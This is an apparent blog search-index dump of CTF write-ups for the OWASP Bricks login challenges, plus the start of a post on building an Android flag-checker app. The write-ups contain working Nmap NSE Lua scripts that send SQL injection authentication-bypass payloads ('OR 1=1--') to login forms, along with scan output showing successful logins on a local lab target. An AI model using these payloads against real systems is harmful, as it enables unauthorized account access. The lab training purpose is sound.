href=\"#hl-0-11\"\u003e11\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-12\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-12\"\u003e12\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-13\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-13\"\u003e13\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-14\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-14\"\u003e14\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-15\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-15\"\u003e15\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-16\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-16\"\u003e16\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-17\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-17\"\u003e17\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-18\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-18\"\u003e18\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-19\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-19\"\u003e19\u003c/a\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-lua\" data-lang=\"lua\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003elocal\u003c/span\u003e http \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e require \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;http\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003elocal\u003c/span\u003e shortport \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e require \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;shortport\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eportrule \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e shortport.http\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eaction \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunction\u003c/span\u003e(host,port)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003elocal\u003c/span\u003e resp,final,query\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  r\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e{}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  r[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;username\u0026#39;\u003c/span\u003e]\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;a\u0026#39;) OR 1=1-- a\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  r[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;passwd\u0026#39;\u003c/span\u003e]\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;test\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  r[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;submit\u0026#39;\u003c/span\u003e]\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Submit\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  resp \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e http.post(host,port,\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/login-3/index.php\u0026#34;\u003c/span\u003e,\u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e,\u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e,r)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  final \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e string.match(resp.body, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026lt;p\u0026gt;.*alert%-box.-\u0026gt;(.-)\u0026lt;a.*\u0026lt;/p\u0026gt;\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  query \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e string.match(resp.body, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;.*SQL Query(.*)\u0026lt;a.*\u0026lt;/div\u0026gt;\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e {payload \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e r ,SQLQuery \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e query , result \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e final}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eend\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cp\u003eThis code is built based on \u003ccode\u003ehttp-title.nse\u003c/code\u003e.\u003c/p\u003e","title":"Bricks Login 3"},{"content":"Challenge Information OWASP Bricks Docker version: here This is a series where I will write my own Nmap NSE script to solve that challenge. This is actually a task given by masta ghimau during MCC 2023.\nChallenge Solution Login level 2 is just a simple SQL injection which javascript validation. Since we are using Nmap NSE to perform SQL injection, it will ignore javascript as it is front end validation. We can use the same NSE script as previous challenge.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 local http = require \u0026#34;http\u0026#34; local shortport = require \u0026#34;shortport\u0026#34; portrule = shortport.http action = function(host,port) local resp,final,query r={} r[\u0026#39;username\u0026#39;]=\u0026#34;a\u0026#39; OR 1=1-- a\u0026#34; r[\u0026#39;passwd\u0026#39;]=\u0026#34;test\u0026#34; r[\u0026#39;submit\u0026#39;]=\u0026#34;Submit\u0026#34; resp = http.post(host,port,\u0026#34;/login-2/index.php\u0026#34;,nil,nil,r) final = string.match(resp.body, \u0026#39;\u0026lt;p\u0026gt;.*alert%-box.-\u0026gt;(.-)\u0026lt;a.*\u0026lt;/p\u0026gt;\u0026#39;) query = string.match(resp.body, \u0026#34;.*SQL Query(.*)\u0026lt;a.*\u0026lt;/div\u0026gt;\u0026#34;) return {payload = r ,SQLQuery = query , result = final} end This code is built based on http-title.nse.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 nmap -p 80 --script=chall2.nse 127.0.0.1 Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-28 19:52 +08 Nmap scan report for localhost (127.0.0.1) Host is up (0.00013s latency). PORT STATE SERVICE 80/tcp open http | chall1: | payload: | submit: Submit | passwd: test | username: a\u0026#39; OR 1=1-- a | SQLQuery: : SELECT * FROM users WHERE name=\u0026#39;a\u0026#39; OR 1=1-- a\u0026#39; and password=\u0026#39;test\u0026#39; |_ result: Succesfully logged in. Nmap done: 1 IP address (1 host up) scanned in 0.15 seconds Things I learned from the challenge Writing custom NSE script ","permalink":"https://callmeks.github.io/posts/bricks-login-2/","summary":"\u003ch2 id=\"challenge-information\"\u003eChallenge Information\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://sechow.com/bricks/\"\u003eOWASP Bricks\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003eDocker version: \u003ca href=\"https://hub.docker.com/r/gjuniioor/owasp-bricks\"\u003ehere\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003eThis is a series where I will write my own Nmap NSE script to solve that challenge. This is actually a task given by \u003ca href=\"https://www.youtube.com/@mastaghimau\"\u003emasta ghimau\u003c/a\u003e during \u003ca href=\"https://cybercamp.my/mcc2023-the-journey-begins/\"\u003eMCC 2023\u003c/a\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 id=\"challenge-solution\"\u003eChallenge Solution\u003c/h2\u003e\n\u003cp\u003eLogin level 2 is just a simple SQL injection which javascript validation. Since we are using Nmap NSE to perform SQL injection, it will ignore javascript as it is front end validation. We can use the same NSE script as previous challenge.\u003c/p\u003e","title":"Bricks Login 2"},{"content":"Challenge Information OWASP Bricks Docker version: here This is a series where I will write my own Nmap NSE script to solve that challenge. This is actually a task given by masta ghimau during MCC 2023.\nChallenge Solution Login level 1 is just a simple SQL injection. The hardest part is writing a custom NSE script.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 local http = require \u0026#34;http\u0026#34; local shortport = require \u0026#34;shortport\u0026#34; portrule = shortport.http action = function(host,port) local resp,final,query r={} r[\u0026#39;username\u0026#39;]=\u0026#34;a\u0026#39; OR 1=1-- a\u0026#34; r[\u0026#39;passwd\u0026#39;]=\u0026#34;test\u0026#34; r[\u0026#39;submit\u0026#39;]=\u0026#34;Submit\u0026#34; resp = http.post(host,port,\u0026#34;/login-1/index.php\u0026#34;,nil,nil,r) final = string.match(resp.body, \u0026#39;\u0026lt;p\u0026gt;.*alert%-box.-\u0026gt;(.-)\u0026lt;a.*\u0026lt;/p\u0026gt;\u0026#39;) query = string.match(resp.body, \u0026#34;.*SQL Query(.*)\u0026lt;a.*\u0026lt;/div\u0026gt;\u0026#34;) return {payload = r ,SQLQuery = query , result = final} end This code is built based on http-title.nse.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 nmap -p 80 --script=chall1.nse 127.0.0.1 Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-28 19:52 +08 Nmap scan report for localhost (127.0.0.1) Host is up (0.00013s latency). PORT STATE SERVICE 80/tcp open http | chall1: | payload: | submit: Submit | passwd: test | username: a\u0026#39; OR 1=1-- a | SQLQuery: : SELECT * FROM users WHERE name=\u0026#39;a\u0026#39; OR 1=1-- a\u0026#39; and password=\u0026#39;test\u0026#39; |_ result: Succesfully logged in. Nmap done: 1 IP address (1 host up) scanned in 0.15 seconds Things I learned from the challenge Writing custom NSE script ","permalink":"https://callmeks.github.io/posts/bricks-login-1/","summary":"\u003ch2 id=\"challenge-information\"\u003eChallenge Information\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://sechow.com/bricks/\"\u003eOWASP Bricks\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003eDocker version: \u003ca href=\"https://hub.docker.com/r/gjuniioor/owasp-bricks\"\u003ehere\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003eThis is a series where I will write my own Nmap NSE script to solve that challenge. This is actually a task given by \u003ca href=\"https://www.youtube.com/@mastaghimau\"\u003emasta ghimau\u003c/a\u003e during \u003ca href=\"https://cybercamp.my/mcc2023-the-journey-begins/\"\u003eMCC 2023\u003c/a\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 id=\"challenge-solution\"\u003eChallenge Solution\u003c/h2\u003e\n\u003cp\u003eLogin level 1 is just a simple SQL injection. The hardest part is writing a custom NSE script.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-1\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-1\"\u003e 1\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-2\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-2\"\u003e 2\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-3\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-3\"\u003e 3\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-4\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-4\"\u003e 4\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-5\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-5\"\u003e 5\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-6\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-6\"\u003e 6\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-7\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-7\"\u003e 7\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-8\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-8\"\u003e 8\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-9\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-9\"\u003e 9\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-10\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-10\"\u003e10\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-11\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-11\"\u003e11\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-12\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-12\"\u003e12\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-13\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-13\"\u003e13\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-14\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-14\"\u003e14\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-15\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-15\"\u003e15\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-16\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-16\"\u003e16\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-17\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-17\"\u003e17\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-18\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-18\"\u003e18\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-19\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-19\"\u003e19\u003c/a\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-lua\" data-lang=\"lua\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003elocal\u003c/span\u003e http \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e require \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;http\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003elocal\u003c/span\u003e shortport \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e require \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;shortport\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eportrule \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e shortport.http\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eaction \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunction\u003c/span\u003e(host,port)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003elocal\u003c/span\u003e resp,final,query\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  r\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e{}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  r[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;username\u0026#39;\u003c/span\u003e]\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;a\u0026#39; OR 1=1-- a\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  r[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;passwd\u0026#39;\u003c/span\u003e]\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;test\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  r[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;submit\u0026#39;\u003c/span\u003e]\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Submit\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  resp \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e http.post(host,port,\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/login-1/index.php\u0026#34;\u003c/span\u003e,\u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e,\u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e,r)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  final \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e string.match(resp.body, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026lt;p\u0026gt;.*alert%-box.-\u0026gt;(.-)\u0026lt;a.*\u0026lt;/p\u0026gt;\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  query \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e string.match(resp.body, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;.*SQL Query(.*)\u0026lt;a.*\u0026lt;/div\u0026gt;\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e {payload \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e r ,SQLQuery \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e query , result \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e final}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eend\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cp\u003eThis code is built based on \u003ccode\u003ehttp-title.nse\u003c/code\u003e.\u003c/p\u003e","title":"Bricks Login 1"},{"content":"Overview about the journey I have 0 knowledge about kotlin as well as creating Android APK. Most of the things that I mentioned below is also my first time.\nPART 0 Here\u0026rsquo;s the part where I started out by exploring how to create an Android APK. Basically just tons of youtube vidoes and blogs. The final decision? I just go with Android Studio. The installation is simple but remember to download system image for Virtual Device which is also a part of Android Studio.\nPART 1 Here\u0026rsquo;s the part where I tried the classic \u0026ldquo;hello world\u0026rdquo; in kotlin. It took me some times to understand how it works but learning \u0026ldquo;hello world\u0026rdquo; is useless as I wanted to create an APK that accepts input and check the input after clicking the button. So there\u0026rsquo;s goes another round of youtubes and blogs. The conclusion of this is just keep copy other people\u0026rsquo;s code to understand more about the code.\nHere\u0026rsquo;s something crucial before you move on to the next part if you wanna copy my code, if you paste the code and some of the code turn red, just right click and import whatever its needed. It works 99% of the times.\nPART 2 Here\u0026rsquo;s the part where I\u0026rsquo;ll explain abit of the code that I copy wrote. Lets start with MainAcitiviy.kt, this is the main file where most of the code will be written in a single program since I\u0026rsquo;m writing it for the first time.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 class MainActivity : ComponentActivity() { override fun onCreate(savedInstanceState: Bundle?) { super.onCreate(savedInstanceState) enableEdgeToEdge() setContent { Shroomish_Flag_CheckerTheme { Scaffold( modifier = Modifier.fillMaxSize() ) { innerPadding -\u0026gt; CustomA( modifier = Modifier.padding(innerPadding) ) } } } } } Most of the code in this section is auto-generated. I modified slightly to change the default function into my own function CustomA. As for modifier, you can just think of controlling the behaviour of the function.\n1 2 3 4 @Composable fun CustomA( modifier: Modifier = Modifier) { ... } As I mentioned previously, I created my own function CustomA. A parameter of modifier is required in order to match the innerPadding. Inside the function, I started by including an image as my APK background.\n1 2 Image(painter = painterResource(id = R.drawable.shroomish), contentDescription = null , modifier = modifier.fillMaxSize() ) To do so, go to Resource Manager and Import Drawables. Then just select the images and remain everything as default. After importing the images, you could just use R.drawable.\u0026lt;your-image-name\u0026gt; to retrieve the images.\n1 2 3 4 5 Column(modifier = Modifier.fillMaxSize(), verticalArrangement = Arrangement.Bottom, horizontalAlignment = Alignment.CenterHorizontally){ ... } The next section is Column, which basically arranges everything in vertical sequence. The modifier is just trying to make it center and put it at bottom.\n1 2 3 4 5 6 7 8 9 var a by remember { mutableStateOf(\u0026#34;\u0026#34;) } OutlinedTextField( value = a, onValueChange = { a = it }, label = { Text(\u0026#34;Flag check\u0026#34;) }, shape = RoundedCornerShape(20.dp), modifier = modifier .fillMaxWidth().background(color = Color.White,shape = RoundedCornerShape(20.dp)) ) This section is where I created a text field. Basically the final value will be stored inside a and remaining it just trying to beautify the text field.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 val wee = LocalContext.current.applicationContext Button(onClick = { if(wee().eee(wee().ed(a))){ Toast.makeText(wee, \u0026#34;Correct Flag\u0026#34;, Toast.LENGTH_SHORT).show() } else { Toast.makeText(wee, \u0026#34;Nope\u0026#34;, Toast.LENGTH_SHORT).show() } }, colors = ButtonDefaults.buttonColors(Color.Black), shape = RoundedCornerShape(20.dp), contentPadding = PaddingValues(start=60.dp, end=60.dp,top=8.dp, bottom=8.dp), modifier = modifier.padding(bottom=200.dp) ){ Text(text = \u0026#34;Check Flag\u0026#34;, fontSize = 22.sp, color = Color.White) } This section is the button of the APK. the first line wee variable is actually used for the \u0026ldquo;pop up message\u0026rdquo; in the APK. As written in the code, it will trigger an if-else statement and there will be a message popped if the button was clicked. The remaining of the code is just to beautify the button.\nHere\u0026rsquo;s an overall outcome of the APK:\nWhile it\u0026rsquo;s kind of ugly, it works so lets just move on from there.\nPART 3 If you 